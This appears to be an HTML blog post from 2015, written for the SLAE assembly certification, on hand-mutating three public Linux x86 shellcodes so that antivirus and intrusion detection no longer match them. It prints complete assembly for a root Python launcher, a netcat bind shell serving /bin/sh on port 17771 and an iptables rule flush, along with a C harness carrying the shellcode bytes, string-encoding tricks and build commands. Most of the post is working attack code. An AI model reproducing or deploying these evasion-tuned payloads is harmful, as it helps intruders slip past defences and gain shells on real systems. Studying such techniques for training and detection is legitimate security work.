@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>    Mutating existing shellcodes (SLAE, Assignment #6)
+</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="http://unlim.xyz/theme/css/cid.css">
+        <link href="http://unlim.xyz/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Nomad Atom Feed" />
+        
+ 
+        <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-touch-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-touch-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-touch-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-touch-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-touch-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-touch-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-touch-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon-180x180.png">
+        <link rel="icon" type="image/png" href="/icons/favicon-32x32.png" sizes="32x32">
+        <link rel="icon" type="image/png" href="/icons/favicon-194x194.png" sizes="194x194">
+        <link rel="icon" type="image/png" href="/icons/favicon-96x96.png" sizes="96x96">
+        <link rel="icon" type="image/png" href="/icons/android-chrome-192x192.png" sizes="192x192">
+        <link rel="icon" type="image/png" href="/icons/favicon-16x16.png" sizes="16x16">
+        <link rel="manifest" href="/icons/manifest.json">
+        <link rel="shortcut icon" href="/icons/favicon.ico">
+        <meta name="msapplication-TileColor" content="#ffffff">
+        <meta name="msapplication-TileImage" content="/icons/mstile-144x144.png">
+        <meta name="msapplication-config" content="/icons/browserconfig.xml">
+        <meta name="theme-color" content="#ffffff">
+    </head>
+    <body>
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+        <![endif]-->
+
+            <div class="container">
+
+<header class="blog-header">
+    <h1><a href="http://unlim.xyz/">Security Nomad</a></h1>
+    <p> Wandering the cyber security realm </p>
+    <nav>
+        <a href="http://unlim.xyz/categories.html">CATEGORIES</a>
+        <a href="http://unlim.xyz/tags.html">TAGS</a>
+        <a href="http://unlim.xyz/archives.html">ARCHIVES</a>
+    </nav>
+</header>
+
+    <div class="post">
+
+        <header>
+            <h1>Mutating existing shellcodes (SLAE, Assignment #6)</h1>
+            <p class="category">
+                Category: <a class="category" href="http://unlim.xyz/category/slae.html"><b>SLAE</b></a>
+            </p>
+            <p class="date">
+                Written on <time datetime="2015-10-08T20:00:00-04:00">Oct 08, 2015</time>
+            </p>
+        </header>
+
+        <article>
+            <p>This post is about modifying shellcode by replacing instructions it uses without changing the overall logic of the given shellcode. This is most often done to evade antivirus and intrusion detection systems.</p>
+<p>There are actually polymorphic engines exist that can take a program and transform it such that the modified version consists of different code yet operates with the same functionality. But in this post we will be doing everything manually.</p>
+<h1>Sample #1: setreuid() + exec /usr/bin/python - 54 bytes by Ali Razmjoo</h1>
+<p>The first sample from the shell-storm.org I will use here is the <a href="http://shell-storm.org/shellcode/files/shellcode-886.php">shellcode that starts the Python interpreter as root</a>. On the referenced page the shellcode is presented using AT&amp;T syntax. Here is the version translated to the Intel syntax with my comments (I renamed the <em>first</em> and <em>last</em> labels so that their purpose is more obvious):</p>
+<div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
+    <span class="k">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+    <span class="c1">; Set real u/gid to root</span>
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x46</span>
+    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+    <span class="nf">jmp</span> <span class="nv">.data</span>
+
+<span class="nl">.code:</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>             <span class="c1">; Load the address to the string into ebx</span>
+    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">15</span><span class="p">],</span> <span class="nb">al</span>    <span class="c1">; Put 0 byte at the end of the string</span>
+    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">16</span><span class="p">],</span> <span class="nb">ebx</span>   <span class="c1">; Copy the address to the string to 4 bytes after the string</span>
+    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">20</span><span class="p">],</span> <span class="nb">eax</span>   <span class="c1">; Copy zeroes after the address to the string</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>          <span class="c1">; execve syscall #</span>
+    <span class="nf">lea</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span>   <span class="c1">; args, the 2rd argument</span>
+    <span class="nf">lea</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">20</span><span class="p">]</span>   <span class="c1">; env vars, the 3rd argument</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+<span class="nl">.data:</span>
+    <span class="nf">call</span> <span class="nv">.code</span>
+    <span class="nl">python:</span> <span class="kd">db</span> <span class="s">&quot;/usr/bin/python&quot;</span>
+</pre></div>
+
+
+<p>Note that the above Assembly program compiles, but does not work by itself because of the self-modifying part. Remember that modifying the executable <em>.text</em> section at runtime is a no-no and leads to a segmentation fault. To test the shellcode we have to employ a framing C program. And the shellcode itself can be copied from the referenced above web page or regenerated using the <a href="https://github.com/reider-roque/reed/tree/master/tools">scdump</a> tool after building an executable from the above source code.</p>
+<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x5b\x31\xc0\x88\x43\x0f\x89\x5b\x10\x89\x43\x14\xb0\x0b\x8d\x4b\x10\x8d\x53</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x14\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x79</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x74\x68\x6f\x6e</span><span class="s">&quot;</span><span class="p">;</span> 
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">shellcode</span><span class="p">)();</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p><img alt="Testing the shellcode" src="http://unlim.xyz/images/mutating-existing-shellcodes/testing-the-shellcode.png" title="Testing the shellcode" />
+<div class="img-caption">Testing the shellcode</div></p>
+<p>At first I wanted to do a step by step modification of every couple instructions preserving the overall functionality, but then after reviewing the given shellcode architecture I realized that it is quite inefficient. So I decided to rewrite most of the code employing a couple of shellcode-shortening techniques I learned while taking the SLAE course. Follows my modified copy of the shellcode with some comments:</p>
+<div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
+    <span class="k">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+    <span class="c1">; Set real u/gid to root</span>
+    <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x46</span>
+    <span class="nf">pop</span> <span class="nb">eax</span>
+    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+    <span class="nf">push</span> <span class="nb">ebx</span>            <span class="c1">; Push null bytes to terminate the string</span>
+    <span class="nf">push</span> <span class="mh">0x6e6f6874</span>     <span class="c1">; Push the //usr/bin/python string</span>
+    <span class="nf">push</span> <span class="mh">0x79702f6e</span>     <span class="c1">; onto the stack</span>
+    <span class="nf">push</span> <span class="mh">0x69622f72</span>
+    <span class="nf">push</span> <span class="mh">0x73752f2f</span>
+    <span class="nf">mul</span> <span class="nb">ebx</span>             <span class="c1">; Zero out EAX and EDX as a result of multiplication by 0</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">; String address, execve 1st argument - program name</span>
+    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>          <span class="c1">; execve syscall #</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</pre></div>
+
+
+<p>First off all note that this shellcode is 38 bytes long vs 54 bytes of the original one, which is a 30% (!) reduction. Here is the list of tricks I employed to reduce the shellcode size:</p>
+<p>1) In the beginning the EAX register needs to be set to the 0x46, which is the syscall code of the setreuid. For that the original shellcode uses</p>
+<div class="highlight"><pre><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x46</span>
+</pre></div>
+
+
+<p>sequence, which takes 4 bytes. To shave off a byte I replaced it with the following equivalent:</p>
+<div class="highlight"><pre><span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x46</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
+</pre></div>
+
+
+<p>2) The original shellcode uses the jmp-call-pop technique for accessing the data in the location-independent manner. I replaced this approach with pushing the string data directly onto the stack. This change alone saved us the most number of bytes.</p>
+<p>3) The original shellcode contains code that was setting unnecessary arguments to <code>execve</code> syscall:</p>
+<div class="highlight"><pre><span class="nf">lea</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span>
+<span class="nf">lea</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">20</span><span class="p">]</span>
+</pre></div>
+
+
+<p>In reality both ECX and EDX registers (2nd and 3rd arguments to execve syscall correspondingly) can be set to 0.</p>
+<p>4) Lastly, to set EAX and EDX registers to 0 in one swoop I used the multiplication instruction:</p>
+<div class="highlight"><pre><span class="nf">mul</span> <span class="nb">ebx</span>
+</pre></div>
+
+
+<p>that stores the quotient into EAX and remainder into EDX. And since the divisor (EBX) was 0, both the quotient and remainder were set to 0.</p>
+<p>To convert the <em>//usr/bin/python</em> string to instructions that are used to push the string onto the stack I used the <a href="https://github.com/reider-roque/reed/tree/master/tools">str4sc</a> tool. I had to add an extra slash to the path so that the string length became a multiple of 4 - a condition necessary for storing null-free strings on the stack.</p>
+<h1>Sample #2: /bin/nc -le /bin/sh -vp 17771 - 58 bytes by Oleg Boytsev</h1>
+<p>Here comes our second shell-storm sample - the <a href="http://shell-storm.org/shellcode/files/shellcode-872.php">netcat assisted bind shell</a>:</p>
+<div class="highlight"><pre><span class="nf">global</span> <span class="no">_start</span>
+<span class="nf">section</span> <span class="no">.text</span>
+ <span class="nl">_start:</span>
+    <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+    <span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+    <span class="nf">push</span> <span class="no">eax</span>
+    <span class="nf">push</span> <span class="mi">0x31373737</span>     <span class="err">;</span><span class="p">-</span><span class="no">vp17771</span>
+    <span class="nf">push</span> <span class="mi">0x3170762d</span>
+    <span class="nf">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="no">esp</span>
+
+    <span class="nf">push</span> <span class="no">eax</span>
+    <span class="nf">push</span> <span class="mi">0x68732f2f</span>     <span class="err">;</span><span class="p">-</span><span class="no">le</span><span class="err">//</span><span class="no">bin</span><span class="err">//</span><span class="no">sh</span>
+    <span class="nf">push</span> <span class="mi">0x6e69622f</span>
+    <span class="nf">push</span> <span class="mi">0x2f656c2d</span>
+    <span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">esp</span>
+
+    <span class="nf">push</span> <span class="no">eax</span>
+    <span class="nf">push</span> <span class="mi">0x636e2f2f</span>     <span class="err">;/</span><span class="no">bin</span><span class="err">//</span><span class="no">nc</span>
+    <span class="nf">push</span> <span class="mi">0x6e69622f</span>
+    <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
+
+    <span class="nf">push</span> <span class="no">edx</span>
+    <span class="nf">push</span> <span class="no">esi</span>
+    <span class="nf">push</span> <span class="no">edi</span>
+    <span class="nf">push</span> <span class="no">ebx</span>
+    <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
+    <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span><span class="mi">11</span>
+    <span class="nf">int</span> <span class="mi">0x80</span>
+</pre></div>
+
+
+<p>There is nothing complicated about this shellcode. All it does is just starts the Netcat listening on port 17771 and serving shell to anyone connecting to that port. From the get-go I found only way to reduce the overall size by 1 byte: replacing all</p>
+<div class="highlight"><pre><span class="nf">push</span> <span class="nb">eax</span>
+</pre></div>
+
+
+<p>instructions with</p>
+<div class="highlight"><pre><span class="nf">push</span> <span class="nb">edx</span>
+</pre></div>
+
+
+<p>And then replacing the</p>
+<div class="highlight"><pre><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">...</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
+</pre></div>
+
+
+<p>sequence (instructions are actually divided by the code) with</p>
+<div class="highlight"><pre><span class="nf">push</span> <span class="kt">byte</span> <span class="mi">11</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
+</pre></div>
+
+
+<p>Here is the result of the above manipulations:</p>
+<div class="highlight"><pre><span class="k">global</span> <span class="nv">_start</span>
+<span class="k">section</span> <span class="nv">.text</span>
+ <span class="nl">_start:</span>
+    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="mh">0x31373737</span>     <span class="c1">;-vp17771</span>
+    <span class="nf">push</span> <span class="mh">0x3170762d</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>
+
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="mh">0x68732f2f</span>     <span class="c1">;-le//bin//sh</span>
+    <span class="nf">push</span> <span class="mh">0x6e69622f</span>
+    <span class="nf">push</span> <span class="mh">0x2f656c2d</span>
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">esp</span>
+
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="mh">0x636e2f2f</span>     <span class="c1">;/bin//nc</span>
+    <span class="nf">push</span> <span class="mh">0x6e69622f</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="nb">esi</span>
+    <span class="nf">push</span> <span class="nb">edi</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">11</span>
+    <span class="nf">pop</span> <span class="nb">eax</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</pre></div>
+
+
+<p>Next I will continue mutate the shellcode, trying to not increase the overall size. One thing we can begin with is playing around the strings we have at our disposal. We can modify them in such a way that overall functionality stays the same. Remember that length for each string must stay a multiple of 4. Here how I modified the strings:</p>
+<div class="highlight"><pre>-vp17771        -&gt;    -lp17771
+-le//bin//sh    -&gt;    -ve/bin///sh
+/bin//nc        -&gt;    //bin/nc
+</pre></div>
+
+
+<p>In the wild I would also change the port number, but for the sake of keeping functionality 100% unchanged I do not do it here.</p>
+<p>And the last change that will complicate AV detection will be replacing one register with another whenever possible throughout the code. This will work because every instruction translates to a different sequence of bytes and that is exactly what we need. Follows the map of replacements I made in the original shellcode and then the whole body of the modified shellcode:</p>
+<div class="highlight"><pre>mov esi, esp -&gt; mov eax, esp
+mov edi, esp -&gt; mov esi, esp
+push esi     -&gt; push eax
+push edi     -&gt; push esi
+</pre></div>
+
+
+<p>The final version:</p>
+<div class="highlight"><pre><span class="k">global</span> <span class="nv">_start</span>
+<span class="k">section</span> <span class="nv">.text</span>
+ <span class="nl">_start:</span>
+    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="mh">0x31373737</span>     <span class="c1">; -lp17771</span>
+    <span class="nf">push</span> <span class="mh">0x31706c2d</span>
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">esp</span>
+
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="mh">0x68732f2f</span>     <span class="c1">; -ve/bin///sh</span>
+    <span class="nf">push</span> <span class="mh">0x2f6e6962</span>
+    <span class="nf">push</span> <span class="mh">0x2f65762d</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>
+
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="mh">0x636e2f6e</span>     <span class="c1">;//bin/nc</span>
+    <span class="nf">push</span> <span class="mh">0x69622f2f</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="nb">eax</span>
+    <span class="nf">push</span> <span class="nb">esi</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">push</span> <span class="kt">byte</span> <span class="mi">11</span>
+    <span class="nf">pop</span> <span class="nb">eax</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</pre></div>
+
+
+<p>I could continue modifying the shellcode to approach zero pattern correlation, but the size of the shellcode will inevitably go up. I will sacrifice the size of the shellcode mutating our last sample and show how some very simple steps can help you on the AV evasion path.</p>
+<h1>Sample #3: Linux/x86 - iptables --flush - 43 bytes by Hamza Megahed</h1>
+<p>The designation of the last shellcode sample I will analyze in this post is to <a href="http://shell-storm.org/shellcode/files/shellcode-825.php">flush all iptables rules</a>. Here is the original listing translated to Intel syntax:</p>
+<p>section .text
+    global _start</p>
+<p>_start:
+    xor eax, eax
+    push eax
+    push word 0x462d
+    mov esi, esp
+    push eax
+    push 0x73656c62
+    push 0x61747069
+    push 0x2f6e6962
+    push 0x732f2f2f
+    mov ebx, esp
+    push eax
+    push esi
+    push ebx
+    mov ecx, esp
+    mov edx, eax
+    mov al, 0xb
+    int 80h</p>
+<p>All the shellcode does is calls the /sbin/iptables with -F flag.</p>
+<p>A couple notes before I begin mutating the code. In this case I will not try to keep the shellcode from growing. Quite opposite, I will expand a line of code into two or more lines. The only limit that I am going to stick to is that the resulted shellcode mutant must not exceed 150% of the original shellcode size.</p>
+<p>Despite of what I've just said I couldn't stop myself from decreasing the shellcode size by 1 byte first =). All in all this change helps us to achieve the end goal of changing the shellcode structure. To shave the byte off I replaced EAX with EDX in the following two instructions:</p>
+<div class="highlight"><pre><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+
+<span class="nf">push</span> <span class="nb">eax</span>
+</pre></div>
+
+
+<p>And to make the shellcode working again I removed</p>
+<div class="highlight"><pre><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>
+</pre></div>
+
+
+<p>and replaced</p>
+<div class="highlight"><pre><span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>
+</pre></div>
+
+
+<p>with</p>
+<div class="highlight"><pre><span class="nf">push</span> <span class="mh">0xb</span>
+<span class="nf">pop</span> <span class="nb">eax</span>
+</pre></div>
+
+
+<p>The line I removed zeroed out EDX, which was unneeded after previous modification, EDX is all 0s already at that step. And the replacement was just an equivalent of loading 0xb (execve syscall #) into EAX that doesn't depend on EAX being zeroed first.</p>
+<p>Here is the intermediate result incorporating the above changes:</p>
+<div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
+    <span class="k">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x462d</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="mh">0x73656c62</span>
+    <span class="nf">push</span> <span class="mh">0x61747069</span>
+    <span class="nf">push</span> <span class="mh">0x2f6e6962</span>
+    <span class="nf">push</span> <span class="mh">0x732f2f2f</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="nb">esi</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">push</span> <span class="mh">0xb</span>
+    <span class="nf">pop</span> <span class="nb">eax</span>
+    <span class="nf">int</span> <span class="mh">80h</span>
+</pre></div>
+
+
+<p>Now let me show how with a little imagination you can expand any instruction thus modifying the underlying opcodes (but be careful to not add null or other bad chars relevant to your case):</p>
+<p>1) The third line pushes the <em>-F</em> string onto the stack. We can expand it in some fancy way:</p>
+<div class="highlight"><pre><span class="nf">mov</span> <span class="nb">bx</span><span class="p">,</span> <span class="mh">0x2316</span>
+<span class="nf">add</span> <span class="nb">bx</span><span class="p">,</span> <span class="mh">0x2317</span>
+<span class="nf">push</span> <span class="nb">bx</span>
+</pre></div>
+
+
+<p>2) Now, why don't we apply some very lame encryption by manually subtracting 1 from every byte of the <em>///sbin/iptables</em> string, and then dynamically add 1 to every byte, when it is already on the stack? Factum dictum. The modified part of the code follows:</p>
+<div class="highlight"><pre>    <span class="nf">push</span> <span class="mh">0x72646b61</span>
+    <span class="nf">push</span> <span class="mh">0x60736F68</span>
+    <span class="nf">push</span> <span class="mh">0x2e6d6861</span>
+    <span class="nf">push</span> <span class="mh">0x722e2e2e</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="c1">; Decryption</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">16</span>
+<span class="nl">.decrypt:</span>
+    <span class="nf">lodsb</span>
+    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>
+    <span class="nf">stosb</span>
+    <span class="nf">loop</span> <span class="nv">.decrypt</span>
+</pre></div>
+
+
+<p>3) I'd be happy to continue bubbling up the code, but at this point the initial 43 bytes of code became 62 bytes, which is just 2 bytes short of the 150% limit. To not waste those 2 bytes and mutate the code a little bit more we can insert a couple of nop-equivalents close to the end of the code. For that purpose I used the <code>std</code> and <code>cld</code> instructions that do not affect anything unless you are working with string instructions.</p>
+<p>The final, working version of mutated shellcode:</p>
+<div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
+    <span class="k">global</span> <span class="nv">_start</span>
+
+<span class="nl">_start:</span>
+    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">mov</span> <span class="nb">bx</span><span class="p">,</span> <span class="mh">0x2316</span>
+    <span class="nf">add</span> <span class="nb">bx</span><span class="p">,</span> <span class="mh">0x2317</span>
+    <span class="nf">push</span> <span class="nb">bx</span>
+    <span class="nf">mov</span> <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="mh">0x72646b61</span>
+    <span class="nf">push</span> <span class="mh">0x60736F68</span>
+    <span class="nf">push</span> <span class="mh">0x2e6d6861</span>
+    <span class="nf">push</span> <span class="mh">0x722e2e2e</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="c1">; Decryption </span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">16</span>
+<span class="nl">.decrypt:</span>
+    <span class="nf">lodsb</span>
+    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>
+    <span class="nf">stosb</span>
+    <span class="nf">loop</span> <span class="nv">.decrypt</span>
+    <span class="nf">push</span> <span class="nb">edx</span>
+    <span class="nf">std</span>
+    <span class="nf">push</span> <span class="nb">ebp</span>
+    <span class="nf">cld</span>
+    <span class="nf">push</span> <span class="nb">ebx</span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+    <span class="nf">push</span> <span class="mh">0xb</span>
+    <span class="nf">pop</span> <span class="nb">eax</span>
+    <span class="nf">int</span> <span class="mh">80h</span>
+</pre></div>
+
+
+<p>And to make sure it is still working you can build it and assuming that your iptables do not contain any rules (as, by default, is the case on Kali Linux) using the following commands:</p>
+<div class="highlight"><pre>nasm -f elf ipt2.asm <span class="o">&amp;&amp;</span> ld -o ipt2 ipt2.o
+iptables -A INPUT -p tcp --dport <span class="m">22</span> -j ACCEPT <span class="o">&amp;&amp;</span> iptables -L -vn
+./ipt2 <span class="o">&amp;&amp;</span> iptables -L -vn
+</pre></div>
+
+
+<p>After running the second command you should see a rule added to the <code>INPUT</code> chain of the filter table. After running the third command the rule should disappear (flushed by our code).</p>
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<p><hr>
+This blog post was created for completing the requirements of the <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert</a> certification. Student id: SLAE-685.</p>
+<p>The source files created while completing the assignment can be found in my <a href="https://github.com/reider-roque/slae">GitHub repository</a>.</p>
+        </article>
+
+        <footer>
+            <p>
+                Tags:  
+ 
+                    <a class="tag" href="/tag/exploit-development.html">exploit-development</a>
+ 
+                    <a class="tag" href="/tag/slae.html">slae</a>
+            </p>
+        </footer>
+
+
+    </div>
+
+
+<footer class="blog-footer">
+
+    <ul class="nav">
+                <li><a href="http://unlim.xyz/blog/">Blog</a></li>
+            <li><a href="https://github.com/reider-roque">Github</h3>
+            </a></li>
+            <li><a href="https://linkedin.com/in/olegmi">Linkedin</h3>
+            </a></li>
+    <script type="text/javascript">
+        // JS ROT13 by http://techblog.tilllate.com/2008/07/20/ten-methods-to-obfuscate-e-mail-addresses-compared/
+        document.write( "<yv><n uers=\"znvygb:byrt@hayvz.klm\" ery=\"absbyybj\">Rznvy</n></yv>".replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}));
+    </script>
+    </ul>
+
+    <p class="disclaimer">
+    Oleg Mitrofanov &copy; 2015
+    </p>
+</footer>
+            </div>
+    </body>
+</html>
